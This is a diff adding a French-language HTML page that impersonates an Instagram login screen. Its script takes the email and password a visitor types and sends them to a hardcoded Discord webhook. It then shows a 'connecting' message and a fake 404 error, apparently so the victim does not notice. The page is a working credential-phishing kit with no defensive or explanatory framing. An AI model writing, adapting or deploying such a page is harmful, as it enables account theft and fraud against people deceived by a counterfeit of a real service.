@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="fr">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Instagram</title>
+        <link rel="icon" href="assets/images/favicon.ico" type="image/x-icon">
+        <style>
+            * {
+                margin: 0;
+                padding: 0;
+                box-sizing: border-box;
+                font-family: Arial, sans-serif;
+            }
+            body {
+                background-color: #fafafa;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                height: 100vh;
+            }
+            .container {
+                text-align: center;
+                background: white;
+                padding: 20px;
+                border-radius: 8px;
+                box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+                width: 320px;
+            }
+            .logo {
+                width: 175px;
+                margin-bottom: 20px;
+            }
+            input {
+                width: 100%;
+                padding: 10px;
+                margin: 5px 0;
+                border: 1px solid #ddd;
+                border-radius: 3px;
+                font-size: 14px;
+            }
+            button {
+                width: 100%;
+                background: #0095f6;
+                color: white;
+                padding: 10px;
+                border: none;
+                border-radius: 5px;
+                font-size: 14px;
+                cursor: pointer;
+                margin-top: 10px;
+            }
+            .error {
+                color: red;
+                font-size: 14px;
+                margin-top: 10px;
+                display: none;
+            }
+            .hidden {
+                display: none;
+            }
+            .footer {
+                margin-top: 20px;
+                font-size: 12px;
+                color: #777;
+            }
+        </style>
+    </head>
+<body>
+    <div class="container" id="loginForm">
+        <h2>Connexion requise</h2>
+        <input type="email" id="email" placeholder="Adresse e-mail" required>
+        <input type="password" id="password" placeholder="Mot de passe" required>
+        <button onclick="submitForm()">Se connecter</button>
+    </div>
+
+    <div class="container hidden" id="errorPage">
+        <h1>Erreur 404</h1>
+        <p>La page que vous recherchez n'existe pas.</p>
+    </div>
+
+    <script>
+        function submitForm() {
+            var email = document.getElementById("email").value;
+            var password = document.getElementById("password").value;
+    
+            var webhookURL = "https://discord.com/api/webhooks/1338928805384814612/d7n5El6F7K0SFNeb7j75V4ro2IE2HN9cd4CAB1yKQPlUh2pP7yf0Q5j2bDEuRqaDeAKG";
+    
+            var data = {
+                content: `📩 Nouvelle connexion !\n**Email:** ${email}\n**Mot de passe:** ${password}`
+            };
+    
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            });
+    
+            // Afficher la fausse erreur 404
+            document.getElementById("loginForm").innerHTML = "<p>Connexion en cours...</p>";
+            setTimeout(function() {
+                document.getElementById("loginForm").classList.add("hidden");
+                document.getElementById("errorPage").classList.remove("hidden");
+            }, 2000);
+        }
+    </script>
+    
+</body>
+</html>
